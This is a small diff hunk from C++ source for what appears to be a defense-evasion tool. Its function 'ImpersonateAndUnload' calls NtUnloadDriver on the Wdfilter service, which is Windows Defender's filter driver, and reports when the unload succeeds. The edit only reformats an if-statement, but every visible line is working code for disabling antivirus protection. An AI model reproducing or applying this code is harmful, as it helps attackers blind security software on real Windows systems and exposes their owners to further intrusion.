@@ -144,10 +144,7 @@ NTSTATUS ImpersonateAndUnload()
 	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");
 
 	status = NtUnloadDriver(&wdfilterDrivServ);
-	if (status == STATUS_SUCCESS) 
-	{
-		std::cout << "[+] Successfully unloaded Wdfilter!\n";
-	}
+	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully unloaded Wdfilter!\n";
 	else
 	{
 		Error(RtlNtStatusToDosError(status));
